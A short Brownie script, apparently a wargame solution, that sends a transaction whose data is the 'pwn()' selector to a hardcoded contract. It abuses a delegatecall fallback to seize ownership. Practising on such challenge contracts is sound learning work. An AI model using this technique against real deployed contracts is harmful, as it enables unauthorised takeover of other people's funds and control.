from brownie import Contract, accounts, interface
from scripts.helpful_scripts import get_account
from web3 import Web3

sig = Web3.toHex(Web3.keccak(text="pwn()"))[0:10]


def main():
    cont = interface.InterfaceToken("0xab2C98f617d9e2Bc4B742608e53CC1bD80c18718")
    account = get_account()
    account.transfer(
        to="0xAB2C98F617D9E2BC4B742608E53CC1BD80C18718", amount=0, data=sig
    )
